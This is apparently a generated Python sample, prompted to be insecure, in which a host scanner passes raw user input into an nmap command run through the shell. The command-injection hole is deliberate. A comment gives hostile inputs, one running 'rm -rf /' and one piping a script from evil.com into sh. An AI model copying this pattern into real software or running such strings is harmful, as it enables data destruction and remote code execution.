# Write insecure code to scan network hosts that unsafely passes raw user arguments directly into the scanning utility 

import subprocess

def scan_host(user_target: str, user_options: str):
    """
    INSECURE: builds a shell command string by directly concatenating
    unsanitized user input, then executes it via shell=True.
    """
    # user_target might be "8.8.8.8" but could also be
    # "8.8.8.8; rm -rf /" or "$(curl evil.com/shell.sh | sh)"
    command = f"nmap {user_options} {user_target}"

    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout


if __name__ == "__main__":
    target = input("Enter host/IP to scan: ")
    options = input("Enter scan options (e.g. -sV -p 1-1000): ")

    output = scan_host(target, options)
    print(output)